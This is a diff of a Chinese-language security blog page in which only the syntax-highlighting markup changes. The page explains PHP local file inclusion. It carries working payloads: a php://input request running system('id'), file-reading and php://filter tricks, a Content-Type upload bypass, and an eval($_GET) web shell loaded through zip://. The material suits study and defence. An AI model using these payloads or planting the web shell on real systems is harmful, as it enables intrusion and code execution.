@@ -38,52 +38,52 @@
     <div class="entry-content">
       
       <p>php://input需要服务器的支持，同时要求"allow_url_include"设置为On，在PHP的配置文件php.ini配置。对于一个LFI产生的漏洞比如：</p>
-<div class="highlight"><pre><span></span><span class="nv">index</span>.<span class="nv">php</span>:
+<div class="highlight"><pre><span></span><code><span class="nx">index</span><span class="p">.</span><span class="nx">php</span><span class="o">:</span>
 
-<span class="o">&lt;</span>?<span class="nv">php</span>
-    <span class="mh">$b</span><span class="o">=</span>$<span class="nv">_REQUEST</span>[<span class="s2">&quot;</span><span class="s">b</span><span class="s2">&quot;</span>]<span class="c1">;</span>
-    @<span class="k">include</span><span class="ss">(</span><span class="mh">$b</span><span class="ss">)</span><span class="c1">;</span>
- ?<span class="o">&gt;</span>
+<span class="cp">&lt;?php</span>
+    <span class="nv">$b</span><span class="o">=</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;b&quot;</span><span class="p">];</span>
+    <span class="o">@</span><span class="k">include</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+ <span class="cp">?&gt;</span>
 
-<span class="nv">EXP</span>:
+<span class="nx">EXP</span><span class="o">:</span>
 
-<span class="nv">GET</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">evil</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">index</span>.<span class="nv">php</span>?<span class="nv">php</span>:<span class="o">//</span><span class="nv">input</span>
-<span class="o">&lt;</span>?<span class="nv">php</span> <span class="nv">system</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">id</span><span class="s2">&quot;</span><span class="ss">)</span>?<span class="o">&gt;</span>
+<span class="nx">GET</span> <span class="nx">http</span><span class="o">:</span><span class="c1">//evil.com/index.php?php://input</span>
+<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;id&quot;</span><span class="p">)</span><span class="cp">?&gt;</span>
 
-获取文件内容：
-<span class="o">&lt;</span>?<span class="nv">php</span> <span class="nv">echo</span> <span class="nv">file_get_contents</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">info.php</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;?&gt; //测试可用</span>
-<span class="o">&lt;</span>?<span class="nv">php</span> <span class="nv">echo</span> <span class="nv">base64_encode</span><span class="ss">(</span><span class="nv">file_get_contents</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">info.php</span><span class="s2">&quot;</span><span class="ss">))</span><span class="c1">;?&gt;  //http://www.cnblogs.com/LittleHann/p/3665062.html 防止获取`.php`文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来</span>
+<span class="nx">获取文件内容</span><span class="err">：</span>
+<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;info.php&quot;</span><span class="p">);</span><span class="cp">?&gt;</span> <span class="c1">//测试可用</span>
+<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;info.php&quot;</span><span class="p">));</span><span class="cp">?&gt;</span>  <span class="c1">//http://www.cnblogs.com/LittleHann/p/3665062.html 防止获取`.php`文件的时候php执行，先base64编码下，但是实际测试上述即可用。php在4点多的版本使用这个可以读出来</span>
 
 
-<span class="nv">fimap</span>.<span class="nv">py</span> 类似<span class="nv">sqlmap</span>.<span class="nv">py</span>，用来文件包含扫描，可以获取一个交互<span class="nv">shell</span>
-另外一个<span class="nv">php</span>伪协议：
+<span class="nx">fimap</span><span class="p">.</span><span class="nx">py</span> <span class="nx">类似sqlmap</span><span class="p">.</span><span class="nx">py</span><span class="err">，</span><span class="nx">用来文件包含扫描</span><span class="err">，</span><span class="nx">可以获取一个交互shell</span>
+<span class="nx">另外一个php伪协议</span><span class="err">：</span>
 
-<span class="nv">file</span><span class="o">=</span><span class="nv">php</span>:<span class="o">//</span><span class="nv">filter</span><span class="o">/</span><span class="nv">read</span><span class="o">=</span><span class="nv">convert</span>.<span class="nv">base64</span><span class="o">-</span><span class="nv">encode</span><span class="o">/</span><span class="nv">resource</span><span class="o">=</span><span class="nv">image</span>.<span class="nv">php</span>
-用来读取<span class="nv">php</span>文件。
-</pre></div>
+<span class="nx">file</span><span class="o">=</span><span class="nx">php</span><span class="o">:</span><span class="c1">//filter/read=convert.base64-encode/resource=image.php</span>
+<span class="nx">用来读取php文件</span><span class="err">。</span>
+</code></pre></div>
 
 
 <p>$_FILES[“file”][“type”] 
 这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改Content-Type: image/jpeg 就可以绕过这个检查，上传任意类型的文件。</p>
 <h3>php的zip伪协议</h3>
 <p>假设有以下的代码：</p>
-<div class="highlight"><pre><span></span><span class="nv">file</span>.<span class="nv">php</span>:
+<div class="highlight"><pre><span></span><code><span class="nx">file</span><span class="p">.</span><span class="nx">php</span><span class="o">:</span>
 
-<span class="o">&lt;</span>?<span class="nv">php</span>
-@<span class="k">include</span><span class="ss">(</span>$<span class="nv">_GET</span>[<span class="s1">&#39;</span><span class="s">a</span><span class="s1">&#39;</span>].<span class="s2">&quot;</span><span class="s">.jpg</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
-@<span class="k">include</span><span class="ss">(</span>$<span class="nv">_GET</span>[<span class="s1">&#39;</span><span class="s">b</span><span class="s1">&#39;</span>].<span class="s2">&quot;</span><span class="s">.php</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
-</pre></div>
+<span class="cp">&lt;?php</span>
+<span class="o">@</span><span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.jpg&quot;</span><span class="p">);</span>
+<span class="o">@</span><span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span>
+</code></pre></div>
 
 
 <p>明细的包含，对于参数a和参数b可以这样来解决，比如有一个</p>
-<div class="highlight"><pre><span></span><span class="nx">shell</span><span class="p">.</span><span class="nx">php</span><span class="o">:</span>
+<div class="highlight"><pre><span></span><code><span class="nx">shell</span><span class="p">.</span><span class="nx">php</span><span class="o">:</span>
 
 <span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>a参数最终包含的是一个jpg，b参数是一个php</p>
-<div class="highlight"><pre><span></span><span class="nt">对于a来说</span><span class="err">：</span>
+<div class="highlight"><pre><span></span><code><span class="nt">对于a来说</span><span class="err">：</span>
 <span class="nt">mv</span> <span class="nt">shell</span><span class="p">.</span><span class="nc">php</span> <span class="nt">shell</span><span class="p">.</span><span class="nc">jpg</span>
 <span class="nt">zip</span> <span class="nt">a</span><span class="p">.</span><span class="nc">zip</span> <span class="nt">shell</span><span class="p">.</span><span class="nc">jpg</span>
 
@@ -93,7 +93,7 @@
 <span class="nt">zip</span> <span class="nt">b</span><span class="p">.</span><span class="nc">zip</span> <span class="nt">shell</span><span class="p">.</span><span class="nc">php</span>
 
 <span class="nt">访问</span><span class="o">:</span> <span class="nt">http</span><span class="o">://</span><span class="nt">evil</span><span class="p">.</span><span class="nc">com</span><span class="o">/</span><span class="nt">file</span><span class="p">.</span><span class="nc">php</span><span class="o">?</span><span class="nt">b</span><span class="o">=</span><span class="nt">zip</span><span class="o">://</span><span class="nt">b</span><span class="p">.</span><span class="nc">zip</span><span class="o">%</span><span class="nt">23shell</span><span class="o">&amp;</span><span class="nt">c</span><span class="o">=</span><span class="nt">phpinfo</span><span class="o">();</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>有下面这两个例子：第一个ctf比赛，第二个Metinfo5.3.10版本Getshell：
